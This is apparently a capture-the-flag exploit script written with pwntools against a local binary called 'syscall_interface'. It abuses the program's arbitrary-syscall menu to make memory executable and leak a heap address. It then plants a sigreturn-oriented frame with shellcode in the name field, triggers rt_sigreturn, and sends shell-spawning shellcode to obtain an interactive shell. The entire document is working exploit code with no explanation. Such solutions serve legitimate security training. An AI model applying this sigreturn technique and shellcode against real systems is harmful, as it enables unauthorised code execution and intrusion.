from pwn import *
def cmd(c):
	p.sendlineafter("ice:",str(c))
def set_name(n):
	cmd(1)
	p.sendafter("name:",n)
def sys(rax,rdi):
	cmd(0)
	p.sendlineafter("ber:",str(rax))
	p.sendlineafter("ment:",str(rdi))
#context.log_level='debug'
p=process('./syscall_interface')
context.arch='amd64'

sys(135,0x0400000)#0
sys(12,0)#1

p.readuntil("RET(")
base=int(p.readuntil(")")[:-1],16)-(0x0000555555778000-0x0000555555757000)
log.info(hex(base))
#rbp rbx rdx rax rcx rsp rip
rbp=base
sh="""
pop rbx
mov rsi,rsp
push rsi
syscall
ret
"""
sig=asm(sh).ljust(0x10,'\x90')+p64(0x100)+p64(0)+p64(0)+p64(base+0x100)+p64(base+0x40)+p64(0)+p64(0x33)
set_name(sig)

sys(12,0)
#gdb.attach(p,'b *0x000555555554EC8')
sys(15,0)#base-0x1000+0x10-0x60)#0

p.send(asm(shellcraft.sh()))

p.interactive()
